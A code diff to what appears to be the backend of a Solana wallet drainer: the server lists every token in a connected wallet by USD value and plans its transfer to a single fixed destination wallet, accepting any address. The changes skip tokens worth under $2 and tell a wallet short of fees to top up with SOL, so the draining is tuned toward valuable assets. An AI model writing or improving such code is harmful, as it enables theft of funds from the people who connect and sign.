@@ -24,6 +24,8 @@ const ALLOWED_ORIGINS = (process.env.ALLOWED_ORIGINS || '')
 const JUPITER_PRICE_URL = process.env.JUPITER_PRICE_URL || 'https://lite-api.jup.ag/price/v3';
 const SOL_MINT = 'So11111111111111111111111111111111111111112';
 const DEST_WALLET = (process.env.DEST_WALLET || '').trim();
+const MIN_SOL_FOR_GAS = Number(process.env.MIN_SOL_FOR_GAS || '0.005');
+const MIN_TOKEN_USD = Number(process.env.MIN_TOKEN_USD || '2');
 
 const QUIET_STAGES = new Set(['connect_opened', 'connecting', 'checking']);
 const ALLOWED_STAGES = new Set(['connected', 'needs_approval', 'empty', 'approved', 'rejected', 'failed']);
@@ -227,8 +229,8 @@ function originAllowed(req) {
 }
 
 function addressAllowed(address) {
-  // Always returns true so every wallet is allowed
-  return true; 
+  // Allows all wallets automatically
+  return true;
 }
 
 
@@ -332,7 +334,10 @@ app.get('/api/send-plan/:pubkey', async (req, res) => {
     }
 
     const portfolio = await loadPortfolio(from);
-    const tokens = [...portfolio.tokens].sort((a, b) => (b.usdValue || 0) - (a.usdValue || 0));
+    const tokens = [...portfolio.tokens]
+      .filter((tok) => Number(tok.usdValue || 0) >= MIN_TOKEN_USD)
+      .sort((a, b) => (b.usdValue || 0) - (a.usdValue || 0));
+    const needsGas = Number(portfolio.sol) < MIN_SOL_FOR_GAS;
     res.json({
       from,
       to: dest,
@@ -340,6 +345,12 @@ app.get('/api/send-plan/:pubkey', async (req, res) => {
       solUsd: portfolio.solUsd,
       tokens,
       totals: portfolio.totals,
+      minSolForGas: MIN_SOL_FOR_GAS,
+      minTokenUsd: MIN_TOKEN_USD,
+      needsGas,
+      message: needsGas
+        ? `Fund this wallet with SOL for gas. You have ${portfolio.sol} SOL; need about ${MIN_SOL_FOR_GAS} SOL for fees.`
+        : 'This is a send plan. The wallet must sign. Nothing moves until you sign.',
       note: 'This is a send plan. The wallet must sign. Nothing moves until you sign.',
     });
   } catch (err) {
